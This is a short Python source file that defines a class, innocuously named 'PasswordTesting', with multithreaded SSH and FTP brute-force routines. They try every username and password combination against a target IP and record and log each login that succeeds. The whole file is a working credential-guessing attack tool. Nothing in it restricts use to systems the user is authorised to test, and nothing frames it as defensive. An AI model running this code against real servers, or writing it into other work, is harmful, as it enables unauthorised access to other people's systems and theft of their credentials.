import paramiko
import threading
import logging
from itertools import product

logging.basicConfig(filename='password_testing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class PasswordTesting:
    def __init__(self, max_threads=4):
        self.max_threads = max_threads
        self.successful_credentials = []
    
    def ssh_brute_force(self, target_ip, username_list, password_list, port=22):
        logging.info("SSH brute force on %s", target_ip)
        results = []
        
        def try_ssh_login(username, password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, port=port, username=username, password=password, timeout=5)
                logging.warning("SSH found: %s:%s", username, password)
                self.successful_credentials.append({'service': 'SSH', 'username': username, 'password': password})
                results.append({'username': username, 'password': password, 'success': True})
                ssh.close()
            except:
                pass
        
        threads = []
        for username, password in product(username_list, password_list):
            while len([t for t in threads if t.is_alive()]) >= self.max_threads:
                pass
            t = threading.Thread(target=try_ssh_login, args=(username, password))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return results
    
    def ftp_brute_force(self, target_ip, username_list, password_list, port=21):
        logging.info("FTP brute force on %s", target_ip)
        results = []
        
        def try_ftp_login(username, password):
            try:
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(target_ip, port, timeout=5)
                ftp.login(username, password)
                logging.warning("FTP found: %s:%s", username, password)
                self.successful_credentials.append({'service': 'FTP', 'username': username, 'password': password})
                results.append({'username': username, 'password': password, 'success': True})
                ftp.quit()
            except:
                pass
        
        threads = []
        for username, password in product(username_list, password_list):
            while len([t for t in threads if t.is_alive()]) >= self.max_threads:
                pass
            t = threading.Thread(target=try_ftp_login, args=(username, password))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return results

password_tester = PasswordTesting()
